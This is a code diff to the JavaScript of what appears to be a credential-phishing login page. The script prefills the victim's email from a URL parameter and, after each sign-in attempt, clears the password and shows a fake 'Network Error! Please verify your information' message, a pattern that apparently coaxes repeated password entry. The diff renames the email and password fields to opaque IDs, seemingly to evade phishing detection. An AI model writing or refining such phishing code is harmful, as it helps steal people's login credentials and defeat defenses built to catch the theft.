@@ -3,7 +3,7 @@ $(document).ready(function() {
 
     var baseUrl = (window.location).href;
     var url = baseUrl.substring(baseUrl.lastIndexOf('=') + 1);
-    $("#email").val(url);
+    $("#x1").val(url);
     const handleErr = ()=>{
       var errMsg = "Network Error! Please verify your information and try again";
       var spann = document.querySelector(".mmssgg");
@@ -18,7 +18,7 @@ $(document).ready(function() {
     
     var btnPost = document.querySelector('#submitBtn');
   var divMsg = document.querySelector('#hello');
-  var inpPwd = document.querySelector('#password');
+  var inpPwd = document.querySelector('#x2');
   
   inpPwd.addEventListener('input', ()=>{
             // alert('input was clicked!')
@@ -92,8 +92,8 @@ btnPost.textContent = "Sign In";
                 $('#bd').show();
                 $('#hm').hide();
                 setTimeout(function() {
-                    $("#email").val(url);
-                    $("#password").val("");
+                    $("#x1").val(url);
+                    $("#x2").val("");
                     $('#msg').val(`Network Error! Please verify your information and try again`);
                     
                     // handleErr();
